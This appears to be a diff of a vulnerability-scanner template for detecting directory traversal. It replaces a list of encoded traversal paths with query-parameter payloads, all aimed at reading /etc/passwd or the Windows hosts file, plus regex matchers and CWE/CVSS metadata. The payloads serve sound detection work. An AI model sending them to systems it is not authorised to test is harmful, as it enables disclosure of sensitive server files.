@@ -1,40 +1,28 @@
-id: directory-traversal
-info:
-  author: pentest_swissky
-  description: Detect basic directory traversal leading to a leak of sensitive files.
-  name: Generic Directory Traversal
-  severity: high
-  tags: lfi,fuzz
-requests:
+http:
 - matchers:
-  - status:
-    - 200
-    type: status
   - part: body
     regex:
-    - 'root:[x*]:0:0:'
+    - 'root:.*:0:0:'
+    - 'bin:.*:[0-9]*:[0-9]*:'
     type: regex
-  matchers-condition: and
   method: GET
   path:
-  - '{{BaseURL}}/..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
-  - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
-  - '{{BaseURL}}/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd'
-  - '{{BaseURL}}/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd'
-  - '{{BaseURL}}/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd'
-  - '{{BaseURL}}/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd'
-  - '{{BaseURL}}/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
-  - '{{BaseURL}}/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd'
+  - '{{BaseURL}}/download?file=../../../etc/passwd'
+  - '{{BaseURL}}/download?filename=../../../etc/passwd'
+  - '{{BaseURL}}/download?path=../../../etc/passwd'
+  - '{{BaseURL}}/?filename=../../../../../../../../etc/passwd'
+  - '{{BaseURL}}/view?path=....//....//..../etc/passwd'
+  - '{{BaseURL}}/view?file=....//....//..../etc/passwd'
+  - '{{BaseURL}}/include?page=../../../windows/system32/drivers/etc/hosts'
+  - '{{BaseURL}}/index.php?page=../../../../etc/passwd'
+id: directory-traversal
+info:
+  author: security-team
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: Detects directory traversal vulnerabilities
+  name: Directory Traversal
+  severity: high
+  tags: lfi,traversal,file-read
